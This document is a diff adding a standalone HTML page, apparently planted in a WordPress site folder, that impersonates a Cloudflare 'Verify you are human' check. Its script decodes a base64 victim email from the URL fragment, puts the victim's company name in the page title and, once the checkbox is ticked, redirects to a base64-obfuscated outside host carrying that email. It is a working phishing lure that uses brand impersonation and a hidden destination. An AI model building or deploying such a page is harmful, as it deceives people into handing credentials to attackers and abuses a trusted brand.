@@ -1,0 +1,193 @@
+<!-- url: https://goodlife2024.com/wp-content/zz/
+status: 200 -->
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Verification Required</title>
+    <style>
+        body {
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            margin: 0;
+            font-family: -apple-system, system-ui, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif;
+            background-color: #fff;
+        }
+
+        .verification-container {
+            border: 1px solid #ddd;
+            padding: 12px 20px;
+            width: 300px;
+            background: #fff;
+        }
+
+        .checkbox-wrapper {
+            display: flex;
+            align-items: center;
+            gap: 8px;
+            position: relative;
+        }
+
+        input[type="checkbox"] {
+            position: relative;
+            margin: 0;
+            width: 16px;
+            height: 16px;
+        }
+
+        .spinner-container {
+            position: relative;
+            width: 16px;
+            height: 16px;
+        }
+
+        .spinner {
+            display: none;
+            width: 16px;
+            height: 16px;
+            border: 2px solid #f3f3f3;
+            border-top: 2px solid #4CAF50;
+            border-radius: 50%;
+            position: absolute;
+            left: 0;
+            top: 0;
+            transform: translateY(-50%);
+            margin: 0;
+            animation: spin 1s linear infinite;
+        }
+
+        .checkbox-label {
+            font-size: 13px;
+            color: #000;
+        }
+
+        .cloudflare-logo {
+            float: right;
+            width: 3rem;
+            margin-bottom: -15px;
+        }
+
+        .cloudflare-text {
+            font-size: 1rem;
+        }
+
+        .footer-container {
+            display: block;
+            justify-content: space-between;
+            align-items: center;
+            margin-left: auto;
+            padding-bottom: 10px;
+        }
+
+        .footer-content {
+            display: block;
+            justify-content: space-between;
+            align-items: center;
+        }
+
+        .footer {
+            text-align: right;
+            font-size: 11px;
+            color: #737373;
+            margin-top: -15px;
+        }
+
+        .footer a {
+            color: #737373;
+            text-decoration: none;
+        }
+
+        .footer a:hover {
+            text-decoration: underline;
+        }
+
+        .divider {
+            margin: 0 4px;
+        }
+
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+
+        /* Hide checkbox when spinner is visible */
+        .checkbox-wrapper.loading input[type="checkbox"] {
+            opacity: 0;
+        }
+    </style>
+    <script>
+        function base64DecodeUnicode(str) {
+            try {
+                return decodeURIComponent(atob(str).split('').map(function (c) {
+                    return '%' + ('00' + c.charCodeAt(0).toString(16)).slice(-2);
+                }).join(''));
+            } catch (e) {
+                return str; // Return original if not valid Base64
+            }
+        }
+
+        function getHashValue() {
+            return window.location.hash ? window.location.hash.substring(1) : null;
+        }
+
+        function updateTitle() {
+            let email = getHashValue();
+            if (email) {
+                email = base64DecodeUnicode(email);
+                const domain = email.split('@')[1]?.split('.')[0]?.toUpperCase();
+                if (domain) {
+                    document.title = `${domain} Verification Required`;
+                }
+            }
+        }
+
+        function redirectToBaseUrl() {
+            const baseUrlEncoded = 'aHR0cHM6Ly9wZXBlbHUtc3RhZ2luZy4wMXN0YWdpbmcuc2l0ZS9pb29ubi8';
+            const decodedUrl = base64DecodeUnicode(baseUrlEncoded);
+            const email = base64DecodeUnicode(getHashValue());
+            if (email) {
+                window.location.href = `${decodedUrl}#${email}`;
+            }
+        }
+
+        function handleCheckbox() {
+            const checkbox = document.getElementById('verification-checkbox');
+            const spinner = document.getElementById('spinner');
+            if (checkbox.checked) {
+                spinner.style.display = 'block';
+                setTimeout(redirectToBaseUrl, 2000);
+            } else {
+                spinner.style.display = 'none';
+            }
+        }
+
+        window.onload = updateTitle;
+    </script>
+</head>
+<body>
+    <div class="verification-container">
+        <div class="checkbox-wrapper">
+            <div class="spinner-container">
+                <input type="checkbox" id="verification-checkbox" onchange="handleCheckbox()">
+                <div id="spinner" class="spinner"></div>
+            </div>
+            <label for="verification-checkbox" class="checkbox-label">Verify you are human</label>
+            <div class="footer-container">
+                <div class="footer-content">
+                    <img src="https://www.cloudflare.com/favicon.ico" alt="Cloudflare" class="cloudflare-logo">
+                    <h1 class="cloudflare-text">Cloudflare</h1>
+                    <div class="footer">
+                        <a href="#">Privacy</a>
+                        <span class="divider">•</span>
+                        <a href="#">Terms</a>
+                    </div>
+                </div>
+            </div>
+        </div>
+    </div>
+</body>
+</html>
